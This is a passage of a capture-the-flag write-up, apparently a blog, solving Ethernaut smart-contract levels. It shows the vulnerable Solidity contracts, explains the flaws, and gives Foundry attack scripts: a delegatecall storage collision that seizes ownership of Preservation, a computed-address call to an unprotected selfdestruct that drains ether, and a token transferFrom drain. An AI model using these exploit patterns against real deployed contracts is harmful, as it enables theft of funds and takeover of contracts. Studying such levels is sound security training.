        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Attacker Balance : </span><span class="dl">"</span><span class="p">,</span> <span class="nx">naughtCoin</span><span class="p">.</span><span class="nf">balanceOf</span><span class="p">(</span><span class="nf">address</span><span class="p">(</span><span class="nx">attack</span><span class="p">)));</span>

        <span class="nx">vm</span><span class="p">.</span><span class="nf">stopBroadcast</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="nx">contract</span> <span class="nx">Attack</span><span class="p">{</span>
    <span class="nx">NaughtCoin</span> <span class="kr">public</span> <span class="nx">naughtCoin</span> <span class="o">=</span> <span class="nc">NaughtCoin</span><span class="p">(</span><span class="mh">0xE4497348f2557Bb7Ecb4631426a0c2d880BE0497</span><span class="p">);</span>

    <span class="kd">function</span> <span class="nf">exploit</span><span class="p">(</span><span class="nx">address</span> <span class="nx">_player</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
        
        <span class="nf">require</span><span class="p">(</span><span class="nx">naughtCoin</span><span class="p">.</span><span class="nf">allowance</span><span class="p">(</span><span class="nx">_player</span><span class="p">,</span> <span class="nf">address</span><span class="p">(</span><span class="k">this</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">,</span> <span class="dl">"</span><span class="s2">Not approved yet</span><span class="dl">"</span><span class="p">);</span>

        <span class="nf">require</span><span class="p">(</span><span class="nx">naughtCoin</span><span class="p">.</span><span class="nf">transferFrom</span><span class="p">(</span><span class="nx">_player</span><span class="p">,</span> <span class="nf">address</span><span class="p">(</span><span class="k">this</span><span class="p">),</span> <span class="nx">naughtCoin</span><span class="p">.</span><span class="nf">balanceOf</span><span class="p">(</span><span class="nx">_player</span><span class="p">)),</span> <span class="dl">"</span><span class="s2">Transfer to Atacker Failed</span><span class="dl">"</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>To run script :</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">source</span> .env
<span class="nv">$ </span>forge script script/NaughtCoinSolve.s.sol:NaughtCoinSolve <span class="nt">--rpc-url</span> <span class="nv">$RPC_URL</span> <span class="nt">--broadcast</span>
</code></pre></div></div>

<h1 id="16-preservation">16 Preservation</h1>

<p><code class="language-plaintext highlighter-rouge">Preservation.sol</code></p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">Preservation</span> <span class="p">{</span>

  <span class="c1">// public library contracts </span>
  <span class="nx">address</span> <span class="kr">public</span> <span class="nx">timeZone1Library</span><span class="p">;</span>
  <span class="nx">address</span> <span class="kr">public</span> <span class="nx">timeZone2Library</span><span class="p">;</span>
  <span class="nx">address</span> <span class="kr">public</span> <span class="nx">owner</span><span class="p">;</span> 
  <span class="nx">uint</span> <span class="nx">storedTime</span><span class="p">;</span>
  <span class="c1">// Sets the function signature for delegatecall</span>
  <span class="nx">bytes4</span> <span class="nx">constant</span> <span class="nx">setTimeSignature</span> <span class="o">=</span> <span class="nf">bytes4</span><span class="p">(</span><span class="nf">keccak256</span><span class="p">(</span><span class="dl">"</span><span class="s2">setTime(uint256)</span><span class="dl">"</span><span class="p">));</span>

  <span class="nf">constructor</span><span class="p">(</span><span class="nx">address</span> <span class="nx">_timeZone1LibraryAddress</span><span class="p">,</span> <span class="nx">address</span> <span class="nx">_timeZone2LibraryAddress</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">timeZone1Library</span> <span class="o">=</span> <span class="nx">_timeZone1LibraryAddress</span><span class="p">;</span> 
    <span class="nx">timeZone2Library</span> <span class="o">=</span> <span class="nx">_timeZone2LibraryAddress</span><span class="p">;</span> 
    <span class="nx">owner</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
  <span class="p">}</span>
 
  <span class="c1">// set the time for timezone 1</span>
  <span class="kd">function</span> <span class="nf">setFirstTime</span><span class="p">(</span><span class="nx">uint</span> <span class="nx">_timeStamp</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
    <span class="nx">timeZone1Library</span><span class="p">.</span><span class="nf">delegatecall</span><span class="p">(</span><span class="nx">abi</span><span class="p">.</span><span class="nf">encodePacked</span><span class="p">(</span><span class="nx">setTimeSignature</span><span class="p">,</span> <span class="nx">_timeStamp</span><span class="p">));</span>
  <span class="p">}</span>

  <span class="c1">// set the time for timezone 2</span>
  <span class="kd">function</span> <span class="nf">setSecondTime</span><span class="p">(</span><span class="nx">uint</span> <span class="nx">_timeStamp</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
    <span class="nx">timeZone2Library</span><span class="p">.</span><span class="nf">delegatecall</span><span class="p">(</span><span class="nx">abi</span><span class="p">.</span><span class="nf">encodePacked</span><span class="p">(</span><span class="nx">setTimeSignature</span><span class="p">,</span> <span class="nx">_timeStamp</span><span class="p">));</span>
  <span class="p">}</span>
<span class="p">}</span>

<span class="c1">// Simple library contract to set the time</span>
<span class="nx">contract</span> <span class="nx">LibraryContract</span> <span class="p">{</span>

  <span class="c1">// stores a timestamp </span>
  <span class="nx">uint</span> <span class="nx">storedTime</span><span class="p">;</span>  

  <span class="kd">function</span> <span class="nf">setTime</span><span class="p">(</span><span class="nx">uint</span> <span class="nx">_time</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
    <span class="nx">storedTime</span> <span class="o">=</span> <span class="nx">_time</span><span class="p">;</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<ul>
  <li>Goal</li>
</ul>

<ol>
  <li>The goal of this level is for you to claim ownership of the instance you are given.</li>
</ol>

<ul>
  <li>Solution</li>
</ul>

<ol>
  <li>Preservation contract uses LibraryContract to set the time in the Preservation contract by using <code class="language-plaintext highlighter-rouge">delegatecall</code>.</li>
  <li>As we know <code class="language-plaintext highlighter-rouge">delegatecall</code> runs the call in the context of the calle contract and updates the storage of the caller contract.</li>
  <li>So, the caller and callee contract storage layout should be matched. If not it may result in storage collision bugs.</li>
  <li>Here the Preservation contract doesn’t matches the LibraryContract storage layout.</li>
  <li>I observed that calling <code class="language-plaintext highlighter-rouge">setSecondTime</code> updates the <code class="language-plaintext highlighter-rouge">timeZone1Library</code> address in the Preservation contract.</li>
  <li>By exploiting this we can write our own attacker contract that implements the <code class="language-plaintext highlighter-rouge">setTime()</code> function and pass that address to the <code class="language-plaintext highlighter-rouge">setSecondTime()</code> function so that it will updte the <code class="language-plaintext highlighter-rouge">timeZone1Library</code> address in the Preservation contract.</li>
  <li>I implemented the Attack contract in such a way that it matches the Preservation storage layout and instead of updating the <code class="language-plaintext highlighter-rouge">stiredTime</code> i updated the <code class="language-plaintext highlighter-rouge">owner</code>. And that makes our attack contract as the owner of the Preservation contract.</li>
</ol>

<p><code class="language-plaintext highlighter-rouge">PreservationSolve.s.sol</code></p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>

<span class="k">import</span> <span class="dl">"</span><span class="s2">forge-std/Script.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="dl">"</span><span class="s2">forge-std/console.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="p">{</span><span class="nx">Preservation</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">../src/Preservation.sol</span><span class="dl">"</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">PreservationSolve</span> <span class="nx">is</span> <span class="nx">Script</span><span class="p">{</span>
    <span class="nx">Preservation</span> <span class="kr">public</span> <span class="nx">preservation</span> <span class="o">=</span> <span class="nc">Preservation</span><span class="p">(</span><span class="mh">0x67403A5bC365868E3f9800c6308ca3623Bb1e446</span><span class="p">);</span>
    <span class="kd">function</span> <span class="nf">run</span><span class="p">()</span> <span class="nx">external</span><span class="p">{</span>
        <span class="nx">vm</span><span class="p">.</span><span class="nf">startBroadcast</span><span class="p">(</span><span class="nx">vm</span><span class="p">.</span><span class="nf">envUint</span><span class="p">(</span><span class="dl">"</span><span class="s2">PRIVATE_KEY</span><span class="dl">"</span><span class="p">));</span>

        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">timeZone1Library Address : </span><span class="dl">"</span><span class="p">,</span> <span class="nx">preservation</span><span class="p">.</span><span class="nf">timeZone1Library</span><span class="p">());</span>
        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">timeZone2Library Address : </span><span class="dl">"</span><span class="p">,</span> <span class="nx">preservation</span><span class="p">.</span><span class="nf">timeZone2Library</span><span class="p">());</span>
        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Owner : </span><span class="dl">"</span><span class="p">,</span> <span class="nx">preservation</span><span class="p">.</span><span class="nf">owner</span><span class="p">());</span>
        
        <span class="nx">Attack</span> <span class="nx">attack</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Attack</span><span class="p">();</span>
        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Attack Address : </span><span class="dl">"</span><span class="p">,</span> <span class="nf">address</span><span class="p">(</span><span class="nx">attack</span><span class="p">));</span>
        

        <span class="nx">attack</span><span class="p">.</span><span class="nf">exploit</span><span class="p">();</span>


        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">timeZone1Library Address : </span><span class="dl">"</span><span class="p">,</span> <span class="nx">preservation</span><span class="p">.</span><span class="nf">timeZone1Library</span><span class="p">());</span>
        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">timeZone2Library Address : </span><span class="dl">"</span><span class="p">,</span> <span class="nx">preservation</span><span class="p">.</span><span class="nf">timeZone2Library</span><span class="p">());</span>
        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Owner : </span><span class="dl">"</span><span class="p">,</span> <span class="nx">preservation</span><span class="p">.</span><span class="nf">owner</span><span class="p">());</span>

        <span class="nx">vm</span><span class="p">.</span><span class="nf">stopBroadcast</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="nx">contract</span> <span class="nx">Attack</span><span class="p">{</span>
    <span class="c1">// matching Preservation Storage Layout</span>
    <span class="nx">address</span> <span class="kr">public</span> <span class="nx">timeZone1Library</span><span class="p">;</span>
    <span class="nx">address</span> <span class="kr">public</span> <span class="nx">timeZone2Library</span><span class="p">;</span>
    <span class="nx">address</span> <span class="kr">public</span> <span class="nx">owner</span><span class="p">;</span> 
    <span class="nx">uint</span> <span class="nx">storedTime</span><span class="p">;</span>


    <span class="kd">function</span> <span class="nf">exploit</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
        <span class="nx">Preservation</span> <span class="nx">preservation</span> <span class="o">=</span> <span class="nc">Preservation</span><span class="p">(</span><span class="mh">0x67403A5bC365868E3f9800c6308ca3623Bb1e446</span><span class="p">);</span>
        <span class="nx">uint</span> <span class="nx">attacker</span> <span class="o">=</span> <span class="nf">uint</span><span class="p">(</span><span class="nf">uint160</span><span class="p">(</span><span class="nf">address</span><span class="p">(</span><span class="k">this</span><span class="p">)));</span>
        <span class="nx">preservation</span><span class="p">.</span><span class="nf">setSecondTime</span><span class="p">(</span><span class="nx">attacker</span><span class="p">);</span> <span class="c1">// updating timeZone1Library address;</span>

        <span class="nx">preservation</span><span class="p">.</span><span class="nf">setFirstTime</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>

    <span class="p">}</span>
    <span class="kd">function</span> <span class="nf">setTime</span><span class="p">(</span><span class="nx">uint</span> <span class="nx">_time</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
        <span class="c1">// owner = address(uint160(_time));</span>
        <span class="nx">owner</span> <span class="o">=</span> <span class="nf">address</span><span class="p">(</span><span class="mh">0x699BceEbD59a5b52bB586C737cD7ba636f3Fe602</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>To run script :</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">source</span> .env
<span class="nv">$ </span>forge script script/PreservationSolve.s.sol:PreservationSolve <span class="nt">--rpc-url</span> <span class="nv">$RPC_URL</span> <span class="nt">--broadcast</span>
</code></pre></div></div>

<h1 id="17-recovery">17 Recovery</h1>

<p><code class="language-plaintext highlighter-rouge">Recovery.sol</code></p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">Recovery</span> <span class="p">{</span>

  <span class="c1">//generate tokens</span>
  <span class="kd">function</span> <span class="nf">generateToken</span><span class="p">(</span><span class="nx">string</span> <span class="nx">memory</span> <span class="nx">_name</span><span class="p">,</span> <span class="nx">uint256</span> <span class="nx">_initialSupply</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
    <span class="k">new</span> <span class="nc">SimpleToken</span><span class="p">(</span><span class="nx">_name</span><span class="p">,</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span> <span class="nx">_initialSupply</span><span class="p">);</span>
  
  <span class="p">}</span>
<span class="p">}</span>

<span class="nx">contract</span> <span class="nx">SimpleToken</span> <span class="p">{</span>

  <span class="nx">string</span> <span class="kr">public</span> <span class="nx">name</span><span class="p">;</span>
  <span class="nf">mapping </span><span class="p">(</span><span class="nx">address</span> <span class="o">=&gt;</span> <span class="nx">uint</span><span class="p">)</span> <span class="kr">public</span> <span class="nx">balances</span><span class="p">;</span>

  <span class="c1">// constructor</span>
  <span class="nf">constructor</span><span class="p">(</span><span class="nx">string</span> <span class="nx">memory</span> <span class="nx">_name</span><span class="p">,</span> <span class="nx">address</span> <span class="nx">_creator</span><span class="p">,</span> <span class="nx">uint256</span> <span class="nx">_initialSupply</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">name</span> <span class="o">=</span> <span class="nx">_name</span><span class="p">;</span>
    <span class="nx">balances</span><span class="p">[</span><span class="nx">_creator</span><span class="p">]</span> <span class="o">=</span> <span class="nx">_initialSupply</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="c1">// collect ether in return for tokens</span>
  <span class="nf">receive</span><span class="p">()</span> <span class="nx">external</span> <span class="nx">payable</span> <span class="p">{</span>
    <span class="nx">balances</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">value</span> <span class="o">*</span> <span class="mi">10</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="c1">// allow transfers of tokens</span>
  <span class="kd">function</span> <span class="nf">transfer</span><span class="p">(</span><span class="nx">address</span> <span class="nx">_to</span><span class="p">,</span> <span class="nx">uint</span> <span class="nx">_amount</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span> 
    <span class="nf">require</span><span class="p">(</span><span class="nx">balances</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span> <span class="o">&gt;=</span> <span class="nx">_amount</span><span class="p">);</span>
    <span class="nx">balances</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span> <span class="o">=</span> <span class="nx">balances</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span> <span class="o">-</span> <span class="nx">_amount</span><span class="p">;</span>
    <span class="nx">balances</span><span class="p">[</span><span class="nx">_to</span><span class="p">]</span> <span class="o">=</span> <span class="nx">_amount</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="c1">// clean up after ourselves</span>
  <span class="kd">function</span> <span class="nf">destroy</span><span class="p">(</span><span class="nx">address</span> <span class="nx">payable</span> <span class="nx">_to</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
    <span class="nf">selfdestruct</span><span class="p">(</span><span class="nx">_to</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<ul>
  <li>Goal</li>
</ul>

<ol>
  <li>This level will be completed if you can recover (or remove) the 0.001 ether from the lost contract address.</li>
</ol>

<ul>
  <li>Solution</li>
</ul>

<ol>
  <li>The SimpleToken contract is funded with 0.001 ether. We need to drain those ether.</li>
  <li>To drain ether we can simply call the <code class="language-plaintext highlighter-rouge">destroy()</code> function of the SimpleToken contract.</li>
  <li>But we dont have the address of the SimpleToken. We can user ETHERSCAN to identify the transaction of Recovery contract to find the address of the SimpleToken.</li>
  <li>We can also use a formula that is mentioned in ethereum yellow paper about how a newly created contract address will be computed.</li>
  <li>The formula is <code class="language-plaintext highlighter-rouge">address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), address(_creator), bytes1(0x01))))))</code></li>
  <li><code class="language-plaintext highlighter-rouge">0xd6</code> and <code class="language-plaintext highlighter-rouge">0x94</code> are constants and the last byte1 is the nonce, i.e, number contracts created from the existed contract. We assume that its one.</li>
  <li>By this formula we can recover the SimpleToken address and call the <code class="language-plaintext highlighter-rouge">destroy()</code> function to drain all ether.</li>
</ol>

<p><code class="language-plaintext highlighter-rouge">RecoverySolve.s.sol</code></p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>

<span class="k">import</span> <span class="dl">"</span><span class="s2">forge-std/Script.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="dl">"</span><span class="s2">forge-std/console.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="p">{</span><span class="nx">Recovery</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">../src/Recovery.sol</span><span class="dl">"</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">RecoverySolve</span> <span class="nx">is</span> <span class="nx">Script</span><span class="p">{</span>
    <span class="nx">Recovery</span> <span class="kr">public</span> <span class="nx">recovery</span> <span class="o">=</span> <span class="nc">Recovery</span><span class="p">(</span><span class="mh">0xb85de0D636d9C15Be34104D65A9eE406001463bE</span><span class="p">);</span>
    <span class="kd">function</span> <span class="nf">run</span><span class="p">()</span> <span class="nx">external</span><span class="p">{</span>
        <span class="nx">vm</span><span class="p">.</span><span class="nf">startBroadcast</span><span class="p">(</span><span class="nx">vm</span><span class="p">.</span><span class="nf">envUint</span><span class="p">(</span><span class="dl">"</span><span class="s2">PRIVATE_KEY</span><span class="dl">"</span><span class="p">));</span>
        <span class="nx">address</span> <span class="nx">myAddress</span> <span class="o">=</span> <span class="nf">address</span><span class="p">(</span><span class="nx">vm</span><span class="p">.</span><span class="nf">envAddress</span><span class="p">(</span><span class="dl">"</span><span class="s2">MY_ADDRESS</span><span class="dl">"</span><span class="p">));</span>
        
        <span class="nx">Attack</span> <span class="nx">attack</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Attack</span><span class="p">();</span>
        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Attack Address : </span><span class="dl">"</span><span class="p">,</span> <span class="nf">address</span><span class="p">(</span><span class="nx">attack</span><span class="p">));</span>
        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">MY Balance : </span><span class="dl">"</span><span class="p">,</span> <span class="nx">myAddress</span><span class="p">.</span><span class="nx">balance</span><span class="p">);</span>
        
        <span class="nx">address</span> <span class="nx">_creator</span> <span class="o">=</span> <span class="nf">address</span><span class="p">(</span><span class="nx">recovery</span><span class="p">);</span>

        <span class="nx">address</span> <span class="nx">token</span> <span class="o">=</span> <span class="nx">attack</span><span class="p">.</span><span class="nf">exploit</span><span class="p">(</span><span class="nx">_creator</span><span class="p">,</span> <span class="nf">payable</span><span class="p">(</span><span class="nx">myAddress</span><span class="p">));</span>
        
        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Token Address : </span><span class="dl">"</span><span class="p">,</span> <span class="nx">token</span><span class="p">);</span>
        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">MY Balance : </span><span class="dl">"</span><span class="p">,</span> <span class="nx">myAddress</span><span class="p">.</span><span class="nx">balance</span><span class="p">);</span>

        <span class="nx">vm</span><span class="p">.</span><span class="nf">stopBroadcast</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="nx">contract</span> <span class="nx">Attack</span><span class="p">{</span>
    <span class="kd">function</span> <span class="nf">exploit</span><span class="p">(</span><span class="nx">address</span> <span class="nx">_creator</span><span class="p">,</span> <span class="nx">address</span> <span class="nx">payable</span> <span class="nx">_myAddress</span><span class="p">)</span> <span class="kr">public</span> <span class="nf">returns</span><span class="p">(</span><span class="nx">address</span><span class="p">){</span>
        <span class="nx">address</span> <span class="nx">missedToken</span> <span class="o">=</span> <span class="nf">address</span><span class="p">(</span><span class="nf">uint160</span><span class="p">(</span><span class="nf">uint256</span><span class="p">(</span><span class="nf">keccak256</span><span class="p">(</span><span class="nx">abi</span><span class="p">.</span><span class="nf">encodePacked</span><span class="p">(</span><span class="nf">bytes1</span><span class="p">(</span><span class="mh">0xd6</span><span class="p">),</span> <span class="nf">bytes1</span><span class="p">(</span><span class="mh">0x94</span><span class="p">),</span> <span class="nf">address</span><span class="p">(</span><span class="nx">_creator</span><span class="p">),</span> <span class="nf">bytes1</span><span class="p">(</span><span class="mh">0x01</span><span class="p">))))));</span>

        <span class="nx">missedToken</span><span class="p">.</span><span class="nf">call</span><span class="p">(</span><span class="nx">abi</span><span class="p">.</span><span class="nf">encodeWithSignature</span><span class="p">(</span><span class="dl">"</span><span class="s2">destroy(address)</span><span class="dl">"</span><span class="p">,</span> <span class="nx">_myAddress</span><span class="p">));</span>

        <span class="k">return</span> <span class="nx">missedToken</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>To run script :</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">source</span> .env
<span class="nv">$ </span>forge script script/RecoverySolve.s.sol:RecoverySolve <span class="nt">--rpc-url</span> <span class="nv">$RPC_URL</span> <span class="nt">--broadcast</span>
</code></pre></div></div>

<h1 id="18-magic-number">18 Magic Number</h1>

<p><code class="language-plaintext highlighter-rouge">MagicNum.sol</code></p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">MagicNum</span> <span class="p">{</span>

  <span class="nx">address</span> <span class="kr">public</span> <span class="nx">solver</span><span class="p">;</span>

  <span class="nf">constructor</span><span class="p">()</span> <span class="p">{}</span>

  <span class="kd">function</span> <span class="nf">setSolver</span><span class="p">(</span><span class="nx">address</span> <span class="nx">_solver</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
    <span class="nx">solver</span> <span class="o">=</span> <span class="nx">_solver</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="cm">/*
    ____________/\\\_______/\\\\\\\\\_____        
     __________/\\\\\_____/\\\///////\\\___       
      ________/\\\/\\\____\///______\//\\\__      
       ______/\\\/\/\\\______________/\\\/___     
        ____/\\\/__\/\\\___________/\\\//_____    
         __/\\\\\\\\\\\\\\\\_____/\\\//________   
          _\///////////\\\//____/\\\/___________  
           ___________\/\\\_____/\\\\\\\\\\\\\\\_ 
            ___________\///_____\///////////////__
  */</span>
<span class="p">}</span>
</code></pre></div></div>

<ul>
  <li>Goal</li>
</ul>

<ol>
  <li>To solve this level, you only need to provide the Ethernaut with a Solver, a contract that responds to whatIsTheMeaningOfLife() with the right number. But the solver contract should be very small at most 10 OPCODES.</li>
</ol>

<ul>
  <li>Solution</li>
</ul>

<ol>
  <li>To solve this challenge we need to write a contract that return 42. But the contract should be written with at most 10 OPCODES.</li>
  <li>We need write our contract in Assembly not in solidity, so that we can build very tiny contract with less OPCODES.</li>
  <li>Then we can convert it into bytecode and deploy onto blockchain and then pass the address to the <code class="language-plaintext highlighter-rouge">setSolver()</code> function.</li>
  <li>Bytecodes are divided into two main types in solidity.
    <ol>
      <li>Runtime bytecode</li>
      <li>Creation bytecode</li>
    </ol>
  </li>
  <li>Runtime bytecode will be stored on blockchain and executes when a call happens</li>
  <li>Creation code consist of <strong>init data</strong>, <strong>runtime data</strong> and <strong>constructor bytecode</strong>. We need to create a runtime code which returns 42 upon call and append it with some init data which is required to deploy a contract.</li>
</ol>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> Create a RUNTIME BYTECODE which returns 42 
 PUSH1 0x2a --&gt; pushing 42 into stack
 PUSH1 0x00
 MSTORE --&gt; Stores 0x2a at 0x00 location
 
 PUSH 0x20  --&gt; pushing 32 into stack
 PUSH 0x00  
 RETURN  --&gt; returns value at 0x00 to 0x20 in memory
 
 ---&gt; Combining this will be runtime code : 602a60005260206000f3
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> // Creating Creation code
 
 PUSH10 0x602a60005260206000f3
 PUSH 0x00
 MSTORE  --&gt; Stores runtime bytecode at 0x00 in memory 

 PUSH 0x0a  --&gt; push 10 into memory : Length of the run time code
 PUSH 0x16  --&gt; push 22 into memory : Offset position
   // MSTORE stores 0x0000000000000000000000602a60005260206000f3 
 RETURN
 
 ---&gt; Creation Code : 69602a60005260206000f3600052600a6016f3
</code></pre></div></div>
<p>We can use this creation code to deploy a contract using <code class="language-plaintext highlighter-rouge">create</code> opcode and pass the address of the deployed contract to <code class="language-plaintext highlighter-rouge">setSolver()</code>.</p>

<p><code class="language-plaintext highlighter-rouge">MagicNumSolve.s.sol</code></p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>

<span class="k">import</span> <span class="dl">"</span><span class="s2">forge-std/Script.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="dl">"</span><span class="s2">forge-std/console.sol</span><span class="dl">"</span><span class="p">;</span>

<span class="k">import</span> <span class="p">{</span><span class="nx">MagicNum</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">../src/MagicNum.sol</span><span class="dl">"</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">MagicNumSolve</span> <span class="nx">is</span> <span class="nx">Script</span><span class="p">{</span>

    <span class="kd">function</span> <span class="nf">run</span><span class="p">()</span> <span class="kr">public</span><span class="p">{</span>
        <span class="nx">vm</span><span class="p">.</span><span class="nf">startBroadcast</span><span class="p">(</span><span class="nx">vm</span><span class="p">.</span><span class="nf">envUint</span><span class="p">(</span><span class="dl">"</span><span class="s2">PRIVATE_KEY</span><span class="dl">"</span><span class="p">));</span>
        <span class="k">new</span> <span class="nc">Attack</span><span class="p">().</span><span class="nf">exploit</span><span class="p">();</span>
        <span class="nx">vm</span><span class="p">.</span><span class="nf">stopBroadcast</span><span class="p">();</span>
    <span class="p">}</span>

<span class="p">}</span>

<span class="nx">contract</span> <span class="nx">Attack</span><span class="p">{</span>
    <span class="nx">MagicNum</span> <span class="kr">public</span> <span class="nx">magicNum</span> <span class="o">=</span> <span class="nc">MagicNum</span><span class="p">(</span><span class="mh">0x396D3C79ecde0C91F14562d41ecf0F7685016b65</span><span class="p">);</span>
    <span class="kd">function</span> <span class="nf">exploit</span><span class="p">()</span> <span class="kr">public</span><span class="p">{</span>
       <span class="nx">bytes</span> <span class="nx">memory</span> <span class="nx">bytecode</span> <span class="o">=</span> <span class="nx">hex</span><span class="dl">"</span><span class="s2">69602a60005260206000f3600052600a6016f3</span><span class="dl">"</span><span class="p">;</span>
       <span class="nx">address</span> <span class="nx">_solver</span><span class="p">;</span>
        <span class="c1">// create(value, offset, size)</span>
       <span class="nx">assembly</span> <span class="p">{</span>
        <span class="nl">_solver</span><span class="p">:</span><span class="o">=</span> <span class="nf">create</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nf">add</span><span class="p">(</span><span class="nx">bytecode</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">),</span> <span class="mh">0x13</span><span class="p">)</span>
       <span class="p">}</span>
